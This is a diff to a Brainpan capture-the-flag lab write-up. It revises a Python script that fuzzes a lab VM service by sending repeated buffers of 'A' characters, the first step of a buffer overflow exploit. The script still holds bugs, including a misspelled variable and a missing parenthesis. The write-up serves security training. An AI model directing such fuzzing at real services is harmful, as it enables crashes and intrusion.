@@ -82,11 +82,13 @@ Let's download the .exe file and have the look with `strings`
 import socket
 
 for i in range(30):
-s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-s.connect(("192.168.56.105",9999)
-payloaod = ("A"*100)
-s.send(payload+"\r\n")
-print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
-s.close
+  s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+  s.connect(("192.168.56.105",9999)
+  payloaod = int(i)*("A"*100)
+  s.send(payload+"\r\n")
+  print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
+  s.close()
 ```
+Here, the Windows IP address given by DHCP is '192.168.56.105'
+
 ![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/sending-A's.png)
